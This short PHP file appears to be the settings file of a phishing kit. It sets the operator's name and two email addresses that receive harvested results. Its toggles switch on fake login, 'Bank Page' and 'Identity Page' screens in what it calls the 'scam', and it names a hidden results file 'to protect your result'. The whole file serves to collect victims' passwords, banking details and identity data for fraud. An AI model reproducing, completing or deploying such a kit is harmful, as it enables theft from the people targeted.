﻿<?php

	error_reporting(E_ERROR | E_PARSE);

	//Put your name.
	$sp_name = "etla3 nayek mala zebi howa";

	//Put your email to receive the result.
	$send_email = "raminehdi@yahoo.com,ayoubretcher@yahoo.com";

	//For use the old login put 'old', for the new login put 'new'.
	$login_theme = "new";

	//If you want to show Secure Page in scam put true, otherwise put false.
	$secure_page = true;

	//If you want to show Bank Page in scam put true, otherwise put false.
	$bank_page = true;

	//If you want to show Identity Page in scam put true, otherwise put false.
	$identity_page = true;

	//Please change the name of result file, For protect your result.
	$savefile_name = "myrez.html";

	//If you want to save result in HTML put true, otherwise put false.
	$save_result = true;
	
?>